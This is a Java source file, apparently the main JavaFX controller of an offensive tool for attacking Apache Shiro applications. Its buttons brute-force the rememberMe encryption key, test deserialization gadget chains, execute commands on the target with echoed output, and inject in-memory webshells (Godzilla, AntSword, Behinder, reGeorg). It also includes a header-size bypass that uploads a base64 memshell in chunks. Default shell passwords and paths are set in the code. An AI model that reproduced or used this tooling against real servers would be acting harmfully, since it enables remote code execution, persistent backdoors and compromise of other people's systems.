package com.summersec.attack.UI;

import com.summersec.attack.Encrypt.KeyGenerator;
import com.summersec.attack.core.AttackService;
import com.summersec.attack.core.HeaderBypassService;
import com.summersec.attack.entity.ControllersFactory;
import com.summersec.attack.utils.Utils;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import java.net.Authenticator;
import java.net.InetSocketAddress;
import java.net.PasswordAuthentication;
import java.net.Proxy;
import java.net.URL;
import java.net.Proxy.Type;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.ResourceBundle;
import javafx.beans.value.ChangeListener;
import javafx.beans.value.ObservableValue;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.control.Alert;
import javafx.scene.control.Button;
import javafx.scene.control.CheckBox;
import javafx.scene.control.ComboBox;
import javafx.scene.control.Label;
import javafx.scene.control.MenuItem;
import javafx.scene.control.RadioButton;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.control.ToggleGroup;
import javafx.scene.control.Alert.AlertType;
import javafx.application.Platform;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.stage.Window;

public class MainController {
    @FXML
    private ResourceBundle resources;
    @FXML
    private URL location;
    @FXML
    private MenuItem proxySetupBtn;
    @FXML
    private ComboBox<String> methodOpt;
    @FXML
    private TextArea globalHeader;
    @FXML
    private TextArea post_data;
    @FXML
    private TextField shiroKeyWord;
    @FXML
    private TextField targetAddress;
    @FXML
    private TextField httpTimeout;
    @FXML
    public TextField shiroKey;
    @FXML
    private CheckBox aesGcmOpt;
    @FXML
    private Button crackKeyBtn;
    @FXML
    private Button crackSpcKeyBtn;
    @FXML
    public ComboBox<String> gadgetOpt;
    @FXML
    public ComboBox<String> echoOpt;
    @FXML
    private Button crackGadgetBtn;
    @FXML
    private Button crackSpcGadgetBtn;
    @FXML
    public TextArea logTextArea;
    @FXML
    private Label proxyStatusLabel;
    public static Map currentProxy = new HashMap();
    public AttackService attackService = null;
    @FXML
    private TextField exCommandText;
    @FXML
    public TextArea execOutputArea;
    @FXML
    private Button executeCmdBtn;
    @FXML
    public ComboBox<String> memShellOpt;
    @FXML
    private TextField shellPathText;
    @FXML
    private TextField shellPassText;
    @FXML
    private Button injectShellBtn;
    @FXML
    public TextArea InjOutputArea;
    @FXML
    public TextArea keytxt;
    @FXML
    public Button keygen;
    @FXML
    public ComboBox<String> bypassMethodOpt;
    @FXML
    public TextField maxCookieLenText;
    @FXML
    public TextField chunkSizeText;
    @FXML
    public TextField bypassFilePathText;
    @FXML
    public TextField bypassDelayText;
    @FXML
    public TextArea memshellB64Area;
    @FXML
    public TextArea bypassOutputArea;
    @FXML
    public TextField bypassCmdText;
    @FXML
    public ComboBox<String> bypassEchoOpt;
    @FXML
    public CheckBox bypassObfuscateOpt;

    private HeaderBypassService bypassService;

    public MainController() {
    }

    @FXML
    void injectShellBtn(ActionEvent event) {
        String memShellType = (String)this.memShellOpt.getValue();
        String shellPass = this.shellPassText.getText();
        String shellPath = this.shellPathText.getText();
        if (AttackService.gadget != null ) {
            this.attackService.injectMem(memShellType, shellPass, shellPath);
        } else {
            this.InjOutputArea.appendText(Utils.log("请先获取密钥和构造链"));
        }

    }

    @FXML
    void executeCmdBtn(ActionEvent event) {
//        String rememberMe = this.GadgetPayload(gadgetOpt, echoOpt, spcShiroKey);
        if (AttackService.attackRememberMe != null) {
            String command = this.exCommandText.getText();
            if (!command.equals("")) {
                this.attackService.execCmdTask(command);
            } else {
                this.execOutputArea.appendText(Utils.log("请先输入获取的命令"));
            }
        } else {
            this.execOutputArea.appendText(Utils.log("请先获取密钥和构造链"));
        }

    }

    @FXML
    void crackSpcGadgetBtn(ActionEvent event) {
        String spcShiroKey = this.shiroKey.getText();
        if (this.attackService == null) {
            this.initAttack();
        }
        if (!spcShiroKey.equals("")) {
            final String gadget = (String) this.gadgetOpt.getValue();
            final String echo = (String) this.echoOpt.getValue();
            final AttackService svc = this.attackService;
            new Thread(() -> {
                boolean flag = svc.gadgetCrack(gadget, echo, spcShiroKey);
                if (!flag) {
                    Platform.runLater(() -> logTextArea.appendText(Utils.log("未找到构造链")));
                }
            }).start();
        } else {
            this.logTextArea.appendText(Utils.log("请先手工填入key或者爆破Shiro key"));
        }

    }

    @FXML
    void crackGadgetBtn(ActionEvent event) {
        String spcShiroKey = this.shiroKey.getText();
        if (this.attackService == null) {
            this.initAttack();
        }

        if (!spcShiroKey.equals("")) {
            final List<String> targets = this.attackService.generateGadgetEcho(this.gadgetOpt.getItems(), this.echoOpt.getItems());
            final AttackService svc = this.attackService;
            new Thread(() -> {
                boolean flag = false;
                for (int i = 0; i < targets.size(); ++i) {
                    String[] t = targets.get(i).split(":");
                    String gadget = t[0];
                    String echo = t[1];
                    flag = svc.gadgetCrack(gadget, echo, spcShiroKey);
                    if (flag) break;
                }
                if (!flag) {
                    Platform.runLater(() -> logTextArea.appendText(Utils.log("未找到构造链")));
                }
            }).start();
        } else {
            this.logTextArea.appendText(Utils.log("请先手工填入key或者爆破Shiro key"));
        }

    }

    @FXML
    void crackSpcKeyBtn(ActionEvent event) {
        this.initAttack();
        if (this.attackService.checkIsShiro()) {
            String spcShiroKey = this.shiroKey.getText();
            if (!spcShiroKey.equals("")) {
                this.attackService.simpleKeyCrack(spcShiroKey);
            } else {
                this.logTextArea.appendText(Utils.log("请输入指定密钥"));
            }
        }

    }

    @FXML
    void crackKeyBtn(ActionEvent event) {
        this.initAttack();
        if (this.attackService.checkIsShiro()) {
            this.attackService.keysCrack();
        }

    }

    @FXML
    void initialize() {
        this.initToolbar();
        this.initComBoBox();
        this.initContext();
        ControllersFactory.controllers.put(MainController.class.getSimpleName(), this);
    }

    public void initAttack() {
        String shiroKeyWordText = this.shiroKeyWord.getText();
        String targetAddressText = this.targetAddress.getText();
        String httpTimeoutText = this.httpTimeout.getText();
        //自定义请求头
        Map<String, String> myheader= new HashMap<>() ;
        if(!this.globalHeader.getText().equals("")) {
            String headers[] = this.globalHeader.getText().split("\\r?\\n|&&&");
            for (int i = 0; i < headers.length; i++ ) {
                String line = headers[i].trim();
                if (line.isEmpty()) continue;
                String header[] = line.split(":", 2);
                if (header.length < 2) continue;
                String hName = header[0].trim();
                String hVal = header[1].trim();
                if ("cookie".equalsIgnoreCase(hName)) {
                    String existing = myheader.get("Cookie");
                    myheader.put("Cookie", existing == null ? hVal : existing + "; " + hVal);
                } else {
                    myheader.put(hName, hVal);
                }
            }
        }
//        this.globalHeader = myheader
        String postData = (String)this.post_data.getText();
        String reqMethod = (String)this.methodOpt.getValue();
        this.attackService = new AttackService(reqMethod, targetAddressText, shiroKeyWordText, httpTimeoutText,myheader,postData);
        if (this.aesGcmOpt.isSelected()) {
            AttackService.aesGcmCipherType = 1;
        } else {
            AttackService.aesGcmCipherType = 0;
        }

    }

    public void initContext() {
        this.shiroKeyWord.setText("rememberMe");
        this.httpTimeout.setText("10");
        this.maxCookieLenText.setText("3500");
        this.chunkSizeText.setText("300");
        this.bypassFilePathText.setText("/tmp/");
        this.bypassDelayText.setText("500");
    }

    public void initComBoBox() {
//        ObservableList<String> methods = FXCollections.observableArrayList(new String[]{"GET", "POST","复杂请求"});
        ObservableList<String> methods = FXCollections.observableArrayList(new String[]{"GET", "POST"});
        this.methodOpt.setPromptText("GET");
        this.methodOpt.setValue("GET");
        this.methodOpt.setItems(methods);
        ObservableList<String> gadgets = FXCollections.observableArrayList(new String[]{ "CommonsBeanutils1","CommonsBeanutils1_183", "CommonsCollections2", "CommonsCollections3", "CommonsCollectionsK1", "CommonsCollectionsK2", "CommonsBeanutilsString", "CommonsBeanutilsString_183", "CommonsBeanutilsAttrCompare", "CommonsBeanutilsAttrCompare_183", "CommonsBeanutilsPropertySource","CommonsBeanutilsPropertySource_183", "CommonsBeanutilsObjectToStringComparator", "CommonsBeanutilsObjectToStringComparator_183"});
//        ObservableList<String> gadgets = FXCollections.observableArrayList(new String[]{ "CommonsBeanutils1" ,"CommonsBeanutils1_183" ,"CommonsCollections2", "CommonsCollections3", "CommonsCollectionsK1", "CommonsCollectionsK2", "CommonsBeanutilsString", "CommonsBeanutilsAttrCompare", "CommonsBeanutilsPropertySource", "CommonsBeanutilsObjectToStringComparator"});
//        ObservableList<String> gadgets = FXCollections.observableArrayList(new String[]{ "CommonsCollections2", "CommonsCollections3", "CommonsCollectionsK1", "CommonsCollectionsK2", "CommonsBeanutilsString", "CommonsBeanutilsAttrCompare", "CommonsBeanutilsPropertySource", "CommonsBeanutilsObjectToStringComparator"});
        this.gadgetOpt.setPromptText("CommonsBeanutilsString");
        this.gadgetOpt.setValue("CommonsBeanutilsString");
        this.gadgetOpt.setItems(gadgets);
        ObservableList<String> echoes = FXCollections.observableArrayList(new String[]{"AllEcho","TomcatEcho", "SpringEcho"});
//        ObservableList<String> echoes = FXCollections.observableArrayList(new String[]{"AllEcho","TomcatEcho", "TomcatEcho2", "SpringEcho"});
        this.echoOpt.setPromptText("TomcatEcho");
        this.echoOpt.setValue("TomcatEcho");
        this.echoOpt.setItems(echoes);
        this.shellPassText.setText("pass1024");
        this.shellPathText.setText("/favicondemo.ico");
        final ObservableList<String> memShells = FXCollections.observableArrayList(new String[]{"哥斯拉[Filter]", "哥斯拉ekp[Filter]","哥斯拉特战2022[Filter]", "蚁剑[Filter]", "冰蝎[Filter]", "NeoreGeorg[Filter]", "reGeorg[Filter]", "哥斯拉[Servlet]", "蚁剑[Servlet]", "冰蝎[Servlet]", "NeoreGeorg[Servlet]", "reGeorg[Servlet]", "ChangeShiroKey[Filter]", "ChangeShiroKey[Filter2]", "BastionFilter", "BastionEncryFilter", "AddDllFilter"});
//        final ObservableList<String> memShells = FXCollections.observableArrayList(new String[]{"哥斯拉[Servlet]", "冰蝎[Servlet]", "蚁剑[Servlet]", "NeoreGeorg[Servlet]", "reGeorg[Servlet]"});
        this.memShellOpt.setPromptText("冰蝎[Filter]");
        this.memShellOpt.setValue("冰蝎[Filter]");
        this.memShellOpt.setItems(memShells);
        this.memShellOpt.getSelectionModel().selectedIndexProperty().addListener(new ChangeListener<Number>() {
            @Override
            public void changed(ObservableValue<? extends Number> observableValue, Number number, Number number2) {
                if (((String)memShells.get(number2.intValue())).contains("reGeorg")  ) {
                    MainController.this.shellPassText.setDisable(true);
                } else {
                    MainController.this.shellPassText.setDisable(false);
                }
                if (((String)memShells.get(number2.intValue())).contains("ChangeShiroKey")){
//                    MainController.this.
                    MainController.this.shellPathText.setDisable(true);
                    MainController.this.shellPassText.setText("FcoRsBKe9XB3zOHbxTG0Lw==");
                }else {
                    MainController.this.shellPathText.setDisable(false);
                }

            }
        });
        this.shellPathText.setText("/favicondemo.ico");

        ObservableList<String> bypassMethods = FXCollections.observableArrayList(
                new String[]{"文件落地", "线程名存储", "系统属性存储"});
        this.bypassMethodOpt.setValue("系统属性存储");
        this.bypassMethodOpt.setItems(bypassMethods);
        this.bypassMethodOpt.getSelectionModel().selectedItemProperty().addListener((obs, old, nw) -> {
            this.bypassFilePathText.setDisable(!"文件落地".equals(nw));
        });
        this.bypassFilePathText.setDisable(true);

        ObservableList<String> bypassEchoTypes = FXCollections.observableArrayList(
                new String[]{"Tomcat", "Spring"});
        this.bypassEchoOpt.setValue("Tomcat");
        this.bypassEchoOpt.setItems(bypassEchoTypes);
    }

    private void initToolbar() {
        this.proxySetupBtn.setOnAction((event) -> {
            Alert inputDialog = new Alert(AlertType.NONE);
            inputDialog.setResizable(true);
            Window window = inputDialog.getDialogPane().getScene().getWindow();
            window.setOnCloseRequest((e) -> {
                window.hide();
            });
            ToggleGroup statusGroup = new ToggleGroup();
            RadioButton enableRadio = new RadioButton("启用");
            RadioButton disableRadio = new RadioButton("禁用");
            enableRadio.setToggleGroup(statusGroup);
            disableRadio.setToggleGroup(statusGroup);
            HBox statusHbox = new HBox();
            statusHbox.setSpacing(10.0D);
            statusHbox.getChildren().add(enableRadio);
            statusHbox.getChildren().add(disableRadio);
            GridPane proxyGridPane = new GridPane();
            proxyGridPane.setVgap(15.0D);
            proxyGridPane.setPadding(new Insets(20.0D, 20.0D, 0.0D, 10.0D));
            Label typeLabel = new Label("类型：");
            ComboBox<String> typeCombo = new ComboBox();
            typeCombo.setItems(FXCollections.observableArrayList(new String[]{"HTTP", "SOCKS"}));
            typeCombo.getSelectionModel().select(0);
            Label IPLabel = new Label("IP地址：");
            TextField IPText = new TextField();
            IPText.setText("127.0.0.1");
            Label PortLabel = new Label("端口：");
            TextField PortText = new TextField();
            PortText.setText("8080");
            Label userNameLabel = new Label("用户名：");
            TextField userNameText = new TextField();
            Label passwordLabel = new Label("密码：");
            TextField passwordText = new TextField();
            Button cancelBtn = new Button("取消");
            Button saveBtn = new Button("保存");
            saveBtn.setDefaultButton(true);
            if (currentProxy.get("proxy") != null) {
                Proxy currProxy = (Proxy)currentProxy.get("proxy");
                String proxyInfo = currProxy.address().toString();
                String[] info = proxyInfo.split(":");
                String hisIpAddress = info[0].replace("/", "");
                String hisPort = info[1];
                IPText.setText(hisIpAddress);
                PortText.setText(hisPort);
                enableRadio.setSelected(true);
                System.out.println(proxyInfo);
            } else {
                enableRadio.setSelected(false);
            }

            saveBtn.setOnAction((e) -> {
                if (disableRadio.isSelected()) {
                    currentProxy.put("proxy", (Object)null);
                    this.proxyStatusLabel.setText("");
                    inputDialog.getDialogPane().getScene().getWindow().hide();
                } else {
                    String type;
                    String ipAddress;
                    if (!userNameText.getText().trim().equals("")) {
                        ipAddress = userNameText.getText().trim();
                        type = passwordText.getText();
                        String finalIpAddress = ipAddress;
                        String finalType = type;
                        Authenticator.setDefault(new Authenticator() {
                            @Override
                            public PasswordAuthentication getPasswordAuthentication() {
                                return new PasswordAuthentication(finalIpAddress, finalType.toCharArray());
                            }
                        });
                    } else {
                        Authenticator.setDefault((Authenticator)null);
                    }

                    currentProxy.put("username", userNameText.getText());
                    currentProxy.put("password", passwordText.getText());
                    ipAddress = IPText.getText();
                    String port = PortText.getText();
                    InetSocketAddress proxyAddr = new InetSocketAddress(ipAddress, Integer.parseInt(port));
                    type = ((String)typeCombo.getValue()).toString();
                    Proxy proxy;
                    if (type.equals("HTTP")) {
                        proxy = new Proxy(Type.HTTP, proxyAddr);
                        currentProxy.put("proxy", proxy);
                    } else if (type.equals("SOCKS")) {
                        proxy = new Proxy(Type.SOCKS, proxyAddr);
                        currentProxy.put("proxy", proxy);
                    }

                    this.proxyStatusLabel.setText("代理生效中: " + ipAddress + ":" + port);
                    inputDialog.getDialogPane().getScene().getWindow().hide();
                }

            });
            cancelBtn.setOnAction((e) -> {
                inputDialog.getDialogPane().getScene().getWindow().hide();
            });
            proxyGridPane.add(statusHbox, 1, 0);
            proxyGridPane.add(typeLabel, 0, 1);
            proxyGridPane.add(typeCombo, 1, 1);
            proxyGridPane.add(IPLabel, 0, 2);
            proxyGridPane.add(IPText, 1, 2);
            proxyGridPane.add(PortLabel, 0, 3);
            proxyGridPane.add(PortText, 1, 3);
            proxyGridPane.add(userNameLabel, 0, 4);
            proxyGridPane.add(userNameText, 1, 4);
            proxyGridPane.add(passwordLabel, 0, 5);
            proxyGridPane.add(passwordText, 1, 5);
            HBox buttonBox = new HBox();
            buttonBox.setSpacing(20.0D);
            buttonBox.setAlignment(Pos.CENTER);
            buttonBox.getChildren().add(cancelBtn);
            buttonBox.getChildren().add(saveBtn);
            GridPane.setColumnSpan(buttonBox, 2);
            proxyGridPane.add(buttonBox, 0, 6);
            inputDialog.getDialogPane().setContent(proxyGridPane);
            inputDialog.showAndWait();
        });
    }

    @FXML
    void Keytxt(ActionEvent actionEvent) {
        KeyGenerator keyGenerator = new KeyGenerator();
        String key = keyGenerator.getKey();
        this.keytxt.appendText(key);
        this.keytxt.appendText("\n");
    }

    private void initBypassService() {
        if (bypassService == null) bypassService = new HeaderBypassService();
        Map<String, String> myheader = new HashMap<>();
        if (!this.globalHeader.getText().isEmpty()) {
            for (String h : this.globalHeader.getText().split("\\r?\\n|&&&")) {
                String line = h.trim();
                if (line.isEmpty()) continue;
                String[] kv = line.split(":", 2);
                if (kv.length < 2) continue;
                String hName = kv[0].trim();
                String hVal = kv[1].trim();
                if ("cookie".equalsIgnoreCase(hName)) {
                    String existing = myheader.get("Cookie");
                    myheader.put("Cookie", existing == null ? hVal : existing + "; " + hVal);
                } else {
                    myheader.put(hName, hVal);
                }
            }
        }
        int maxLen, timeout;
        try { maxLen = Integer.parseInt(this.maxCookieLenText.getText()); } catch (Exception e) { maxLen = 3500; }
        try { timeout = Integer.parseInt(this.httpTimeout.getText()) * 1000; } catch (Exception e) { timeout = 10000; }
        int aesGcm = this.aesGcmOpt.isSelected() ? 1 : 0;
        boolean obf = this.bypassObfuscateOpt.isSelected();
        bypassService.init(this.targetAddress.getText(), this.shiroKeyWord.getText(),
                (String) this.methodOpt.getValue(), this.post_data.getText(),
                timeout, maxLen, aesGcm, obf, myheader);
    }

    @FXML
    void bypassCheckShiro(ActionEvent event) {
        if (this.targetAddress.getText().isEmpty()) { this.bypassOutputArea.appendText(Utils.log("请填入目标地址")); return; }
        initBypassService();
        bypassService.checkIsShiro();
    }

    @FXML
    void bypassCrackKey(ActionEvent event) {
        if (this.targetAddress.getText().isEmpty()) { this.bypassOutputArea.appendText(Utils.log("请填入目标地址")); return; }
        initBypassService();
        bypassService.crackAllKeys();
    }

    @FXML
    void bypassCrackSpcKey(ActionEvent event) {
        String key = this.shiroKey.getText();
        if (key == null || key.isEmpty()) { this.bypassOutputArea.appendText(Utils.log("请填入指定密钥")); return; }
        initBypassService();
        bypassService.crackSingleKey(key);
    }

    @FXML
    void bypassCrackGadget(ActionEvent event) {
        initBypassService();
        bypassService.crackAllGadgets();
    }

    @FXML
    void bypassCrackSpcGadget(ActionEvent event) {
        initBypassService();
        bypassService.crackSpcGadget();
    }

    @FXML
    void bypassExecBlind(ActionEvent event) {
        String cmd = this.bypassCmdText.getText();
        if (cmd == null || cmd.isEmpty()) { this.bypassOutputArea.appendText(Utils.log("请输入命令")); return; }
        initBypassService();
        bypassService.execCmdBlind(cmd);
    }

    @FXML
    void bypassExecEcho(ActionEvent event) {
        String cmd = this.bypassCmdText.getText();
        if (cmd == null || cmd.isEmpty()) { this.bypassOutputArea.appendText(Utils.log("请输入命令")); return; }
        initBypassService();
        String echoType = (String) this.bypassEchoOpt.getValue();
        if (echoType == null) echoType = "Tomcat";
        bypassService.execCmdEcho(cmd, echoType);
    }

    @FXML
    void bypassInject(ActionEvent event) {
        String b64 = this.memshellB64Area.getText();
        if (b64 == null || b64.trim().isEmpty()) { this.bypassOutputArea.appendText(Utils.log("请填入内存马Base64")); return; }
        initBypassService();
        int methodIdx = this.bypassMethodOpt.getSelectionModel().getSelectedIndex();
        if (methodIdx < 0) methodIdx = 2;
        int chunkSize, delay;
        try { chunkSize = Integer.parseInt(this.chunkSizeText.getText()); } catch (Exception e) { chunkSize = 300; }
        try { delay = Integer.parseInt(this.bypassDelayText.getText()); } catch (Exception e) { delay = 500; }
        bypassService.injectMemshell(methodIdx, b64.trim(), chunkSize, delay, this.bypassFilePathText.getText());
    }

    @FXML
    void bypassCalcChunk(ActionEvent event) {
        initBypassService();
        int methodIdx = this.bypassMethodOpt.getSelectionModel().getSelectedIndex();
        if (methodIdx < 0) methodIdx = 2;
        final int mi = methodIdx;
        new Thread(() -> {
            int optimal = bypassService.calculateOptimalGroupSize(mi);
            Platform.runLater(() -> chunkSizeText.setText(String.valueOf(optimal)));
        }).start();
    }

    @FXML
    void bypassStop(ActionEvent event) {
        if (bypassService != null) {
            bypassService.stop();
            this.bypassOutputArea.appendText(Utils.log("正在停止..."));
        }
    }

    @FXML
    void showUpdateDialog(ActionEvent event) {
        Alert alert = new Alert(AlertType.INFORMATION);
        alert.setTitle("更新版本");
        alert.setHeaderText("请关注公众号获取最新版本");
        Image img = new Image(getClass().getResourceAsStream("/weixin.jpg"));
        ImageView iv = new ImageView(img);
        iv.setFitWidth(300);
        iv.setPreserveRatio(true);
        alert.setGraphic(iv);
        alert.showAndWait();
    }

}
